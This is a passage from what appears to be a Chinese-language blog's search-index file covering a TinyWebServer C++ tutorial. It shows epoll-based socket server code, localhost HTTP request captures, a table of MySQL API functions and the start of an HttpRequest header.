class="built_in">DealWrite_</span>(&amp;users_[fd]);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;Unexpected event&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">WebServer::InitSocket_</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> ret;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> addr;</span><br><span class="line">  <span class="keyword">if</span> (port_ &gt; <span class="number">65535</span> || port_ &lt; <span class="number">1024</span>) &#123;</span><br><span class="line">    <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;Port:%d error!&quot;</span>, port_);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  addr.sin_family = AF_INET;</span><br><span class="line">  addr.sin_addr.s_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">  addr.sin_port = <span class="built_in">htons</span>(port_);</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">linger</span> optLinger = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">if</span> (openLinger_) &#123;</span><br><span class="line">    optLinger.l_onoff = <span class="number">1</span>;  <span class="comment">//启用linger</span></span><br><span class="line">    optLinger.l_linger = <span class="number">1</span>; <span class="comment">//当关闭套接字时延时1s</span></span><br><span class="line">  &#125;</span><br><span class="line">  listenFd_ = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">//  ipv4    流套接字    自动选择默认协议</span></span><br><span class="line">  <span class="keyword">if</span> (listenFd_ &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;Create socket error!&quot;</span>, port_);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//设置优雅关闭;</span></span><br><span class="line">  ret = <span class="built_in">setsockopt</span>(listenFd_, SOL_SOCKET, SO_LINGER, &amp;optLinger,</span><br><span class="line">                   <span class="built_in">sizeof</span>(optLinger));</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">close</span>(listenFd_);</span><br><span class="line">    <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;Init linger error!&quot;</span>, port_);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//端口复用</span></span><br><span class="line">  <span class="type">int</span> optval = <span class="number">1</span>;</span><br><span class="line">  ret = <span class="built_in">setsockopt</span>(listenFd_, SOL_SOCKET, SO_REUSEADDR, (<span class="type">const</span> <span class="type">void</span> *)&amp;optval,</span><br><span class="line">                   <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">  <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;set socket setsockopt error !&quot;</span>);</span><br><span class="line">    <span class="built_in">close</span>(listenFd_);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ret = <span class="built_in">bind</span>(listenFd_, (<span class="keyword">struct</span> sockaddr *)&amp;addr, <span class="built_in">sizeof</span>(addr));</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;Bind Port:%d error!&quot;</span>, port_);</span><br><span class="line">    <span class="built_in">close</span>(listenFd_);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ret = <span class="built_in">listen</span>(listenFd_, <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;Listen port:%d error!&quot;</span>, port_);</span><br><span class="line">    <span class="built_in">close</span>(listenFd_);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ret = epoller_-&gt;<span class="built_in">AddFd</span>(listenFd_, listenEvent_ | EPOLLIN);</span><br><span class="line">  <span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;Add listen error!&quot;</span>);</span><br><span class="line">    <span class="built_in">close</span>(listenFd_);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">SetFdNonblock</span>(listenFd_);</span><br><span class="line">  <span class="built_in">LOG_INFO</span>(<span class="string">&quot;Server port:%d&quot;</span>, port_);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">WebServer::InitEventMode_</span><span class="params">(<span class="type">int</span> trigMode)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//初始化为水平触发模式</span></span><br><span class="line">  listenEvent_ = EPOLLRDHUP;</span><br><span class="line">  connEvent_ = EPOLLONESHOT | EPOLLRDHUP;</span><br><span class="line">  <span class="keyword">switch</span> (trigMode) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    connEvent_ |= EPOLLET;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    listenEvent_ |= EPOLLET;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    listenEvent_ |= EPOLLET;</span><br><span class="line">    connEvent_ |= EPOLLET;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    listenEvent_ |= EPOLLET;</span><br><span class="line">    connEvent_ |= EPOLLET;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  HttpConn::isET = (connEvent_ &amp; EPOLLET);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">WebServer::AddClient_</span><span class="params">(<span class="type">int</span> fd, sockaddr_in addr)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">assert</span>(fd &gt; <span class="number">0</span>);</span><br><span class="line">  users_[fd].<span class="built_in">init</span>(fd, addr);</span><br><span class="line">  <span class="keyword">if</span> (timeoutMS_ &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    timer_-&gt;<span class="built_in">add</span>(fd, timeoutMS_,</span><br><span class="line">                std::<span class="built_in">bind</span>(&amp;WebServer::CloseConn_, <span class="keyword">this</span>, &amp;users_[fd]));</span><br><span class="line">  &#125;</span><br><span class="line">  epoller_-&gt;<span class="built_in">AddFd</span>(fd, EPOLLIN | connEvent_);</span><br><span class="line">  <span class="built_in">SetFdNonblock</span>(fd);</span><br><span class="line">  <span class="built_in">LOG_INFO</span>(<span class="string">&quot;Client[%d] in!&quot;</span>, users_[fd].<span class="built_in">GetFd</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接受连接</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">WebServer::DealListen_</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> addr;</span><br><span class="line">  <span class="type">socklen_t</span> len = <span class="built_in">sizeof</span>(addr);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = <span class="built_in">accept</span>(listenFd_, (<span class="keyword">struct</span> sockaddr *)&amp;addr, &amp;len);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt;= <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (HttpConn::userCount &gt;= MAX_FD) &#123;</span><br><span class="line">      <span class="built_in">SendError_</span>(fd, <span class="string">&quot;Server busy!&quot;</span>);</span><br><span class="line">      <span class="built_in">LOG_WARN</span>(<span class="string">&quot;Clients is full!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">AddClient_</span>(fd, addr);</span><br><span class="line">  &#125; <span class="keyword">while</span> (listenEvent_ &amp; EPOLLET);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">WebServer::DealWrite_</span><span class="params">(HttpConn *client)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">assert</span>(client);</span><br><span class="line">  <span class="built_in">ExtentTime_</span>(client);</span><br><span class="line">  threadpool_-&gt;<span class="built_in">AddTask</span>(std::<span class="built_in">bind</span>(&amp;WebServer::OnWrite_, <span class="keyword">this</span>, client));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">WebServer::DealRead_</span><span class="params">(HttpConn *client)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">assert</span>(client);</span><br><span class="line">  <span class="built_in">ExtentTime_</span>(client);</span><br><span class="line">  threadpool_-&gt;<span class="built_in">AddTask</span>(std::<span class="built_in">bind</span>(&amp;WebServer::OnRead_, <span class="keyword">this</span>, client));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">WebServer::SendError_</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">char</span> *info)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">assert</span>(fd &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="type">int</span> ret = <span class="built_in">send</span>(fd, info, <span class="built_in">strlen</span>(info), <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">LOG_WARN</span>(<span class="string">&quot;send error to client[%d] error!&quot;</span>, fd);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">WebServer::ExtentTime_</span><span class="params">(HttpConn *client)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">assert</span>(client);</span><br><span class="line">  <span class="keyword">if</span> (timeoutMS_ &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    timer_-&gt;<span class="built_in">adjust</span>(client-&gt;<span class="built_in">GetFd</span>(), timeoutMS_);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">WebServer::CloseConn_</span><span class="params">(HttpConn *client)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">assert</span>(client);</span><br><span class="line">  <span class="built_in">LOG_INFO</span>(<span class="string">&quot;Client[%d] quit!&quot;</span>, client-&gt;<span class="built_in">GetFd</span>());</span><br><span class="line">  epoller_-&gt;<span class="built_in">DelFd</span>(client-&gt;<span class="built_in">GetFd</span>());</span><br><span class="line">  client-&gt;<span class="built_in">Close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">WebServer::OnRead_</span><span class="params">(HttpConn *client)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">assert</span>(client);</span><br><span class="line">  <span class="type">int</span> res = <span class="number">-1</span>;</span><br><span class="line">  <span class="type">int</span> readErrno = <span class="number">0</span>;</span><br><span class="line">  res = client-&gt;<span class="built_in">read</span>(&amp;readErrno);</span><br><span class="line">  <span class="keyword">if</span> (res &lt;= <span class="number">0</span> &amp;&amp; readErrno != EAGAIN) &#123;</span><br><span class="line">    <span class="built_in">CloseConn_</span>(client);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">OnProcess</span>(client);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">WebServer::OnWrite_</span><span class="params">(HttpConn *client)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">assert</span>(client);</span><br><span class="line">  <span class="type">int</span> res = <span class="number">-1</span>;</span><br><span class="line">  <span class="type">int</span> writeErrno = <span class="number">0</span>;</span><br><span class="line">  res = client-&gt;<span class="built_in">write</span>(&amp;writeErrno);</span><br><span class="line">  <span class="keyword">if</span> (client-&gt;<span class="built_in">ToWriteBytes</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (client-&gt;<span class="built_in">IsKeepAlive</span>()) &#123;</span><br><span class="line">      <span class="built_in">OnProcess</span>(client);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (writeErrno == EAGAIN) &#123;</span><br><span class="line">      epoller_-&gt;<span class="built_in">AddFd</span>(client-&gt;<span class="built_in">GetFd</span>(), connEvent_ | EPOLLOUT);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">CloseConn_</span>(client);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">WebServer::OnProcess</span><span class="params">(HttpConn *client)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (client-&gt;<span class="built_in">process</span>()) &#123;</span><br><span class="line">    epoller_-&gt;<span class="built_in">ModFd</span>(client-&gt;<span class="built_in">GetFd</span>(), connEvent_ | EPOLLOUT);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    epoller_-&gt;<span class="built_in">ModFd</span>(client-&gt;<span class="built_in">GetFd</span>(), connEvent_ | EPOLLIN);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">WebServer::SetFdNonblock</span><span class="params">(<span class="type">int</span> fd)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">assert</span>(fd &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fcntl</span>(fd, F_SETFL, <span class="built_in">fcntl</span>(fd, F_GETFD, <span class="number">0</span>) | O_NONBLOCK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> TinyWebServer </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> TinyWebServer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TinyWebServer http</title>
      <link href="/2024/05/06/TinyWebServer/0x5http/"/>
      <url>/2024/05/06/TinyWebServer/0x5http/</url>
      
        <content type="html"><![CDATA[<h1 id="http"><a href="#http" class="headerlink" title="http"></a>http</h1><h3 id="http报文结构"><a href="#http报文结构" class="headerlink" title="http报文结构"></a>http报文结构</h3><p>我们可以通过<code>burpsuite</code>来抓取http请求，然后根据请求编写处理程序。</p><ul><li>这是申请登录的请求</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1//请求行</span><br><span class="line">/*请求头部</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:1316</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost:1316</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:1316/login</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line">*/</span><br><span class="line">username=+%E7%BD%97&amp;password=123456//请求体输入：(空格)罗 123456</span><br></pre></td></tr></table></figure><ul><li>这是请求图片的请求</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /picture HTTP/1.1//请求行</span><br><span class="line">/*请求头部</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:1316</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:1316/login</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><ul><li>这是返回的http请求</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Connection: close</span><br><span class="line">Content-type: text/html</span><br><span class="line">Content-length: 3347</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>MYSQL头文件常用函数</p><div class="table-container"><table><thead><tr><th>函数或结构体</th><th>描述</th></tr></thead><tbody><tr><td><code>MYSQL_FIELD</code></td><td>用于表示结果集中的列信息，包括列名、列类型、列大小等。</td></tr><tr><td><code>MYSQL_RES</code></td><td>表示 SQL 查询结果集的结构体。执行查询后，结果会被存储在这个结构体中。</td></tr><tr><td><code>mysql_query()</code></td><td>用于执行一个 SQL 查询的函数。它接受一个 MySQL 连接句柄和一个 SQL 查询字符串作为参数。</td></tr><tr><td><code>mysql_free_result()</code></td><td>用于释放由 <code>mysql_store_result()</code> 返回的结果集占用的内存的函数。</td></tr><tr><td><code>mysql_store_result()</code></td><td>用于获取并存储 <code>mysql_query()</code> 执行的查询结果的函数。它返回一个 <code>MYSQL_RES</code> 类型的结果集。</td></tr><tr><td><code>mysql_num_fields()</code></td><td>用于获取结果集中的列数的函数。</td></tr><tr><td><code>mysql_fetch_fields()</code></td><td>用于获取结果集中的列信息数组的函数，数组的每个元素都是一个 <code>MYSQL_FIELD</code> 结构体。</td></tr><tr><td><code>mysql_fetch_row()</code></td><td>用于从结果集中获取一行数据的函数。它返回一个指向字符串数组的指针，数组中的每个元素都对应结果集中的一列。</td></tr><tr><td><code>mysql_free_result()</code></td><td>用于释放结果集占用的内存的函数。</td></tr></tbody></table></div><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> &#123;</span><br><span class="line">    <span class="type">short</span> <span class="type">int</span> sin_family;   <span class="comment">// 通常设置为 AF_INET，表示 IPv4 地址</span></span><br><span class="line">    u_short <span class="type">int</span> sin_port;   <span class="comment">// 端口号，以网络字节顺序存储</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in_addr</span> sin_addr;  <span class="comment">// IP 地址</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="HttpRequest-h"><a href="#HttpRequest-h" class="headerlink" title="HttpRequest.h"></a>HttpRequest.h</h3><ul><li>这里我使用<code>enum class</code>提供更强的类型安全和更清晰的代码结构。<code>enum</code>与<code>enum class</code>的区别<a href="https://blog.csdn.net/qq_43331089/article/details/121655801">enum 与 enum class 的区别_enum和enum class-CSDN博客</a>。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HTTP_REQUEST_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HTTP_REQUEST_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;regex&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mysql/mysql.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../log/log.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../buffer/buffer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../pool/sqlconnpool.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../pool/sqlconnRAII.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HttpRequest</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">enum class</span> <span class="title class_">PARSE_STATE</span>&#123;</span><br><span class="line">            REQUEST_LINE,</span><br><span class="line">            HEADERS,</span><br><span class="line">            BODY,</span><br><span class="line">            FINISH,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">enum class</span> <span class="title class_">HTTP_CODE</span>&#123;</span><br><span class="line">            NO_REQUEST = <span class="number">0</span>,</span><br><span class="line">            GET_REQUEST,</span><br><span class="line">            BAD_REQUEST,</span><br><span class="line">            NO_RESOURSEA,</span><br><span class="line">            FORBIDDENT_REQUEST,</span><br><span class="line">            FILE_REQUEST,</span><br><span class="line">            INTERNAL_ERROR,</span><br><span class="line">            CLOSED_CONNECTION,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">HttpRequest</span>();</span><br><span class="line">    ~<span class="built_in">HttpRequest</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Init</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">parse</span><span class="params">(Buffer&amp; buff)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">std::string <span class="title">path</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">    <span class="function">std::string&amp; <span class="title">path</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">std::string <span class="title">method</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">    <span class="function">std::string <span class="title">version</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">    <span class="function">std::string <span class="title">GetPost</span><span class="params">(<span class="type">const</span> std::string&amp; key)</span> <span class="type">const</span></span>;</span><br><span class="line">    <span class="function">std::string <span class="title">GetPost</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* key)</span> <span class="type">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">IsKeepAlive</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">    TODO</span></span><br><span class="line"><span class="comment">    void HttpConn::ParseFormData() &#123;&#125;</span></span><br><span class="line"><span class="comment">    void HttpConn::ParseJson() &#123;&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">ParesRequestLine_</span><span class="params">(<span class="type">const</span> std::string&amp; line)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">ParseHeader_</span><span class="params">(<span class="type">const</span> std::string&amp; line)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">ParseBody_</span><span class="params">(<span class="type">const</span> std::string&amp; line)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">ParsePath_</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">ParsePost_</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">ParseFromUrlencoded_</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> <span 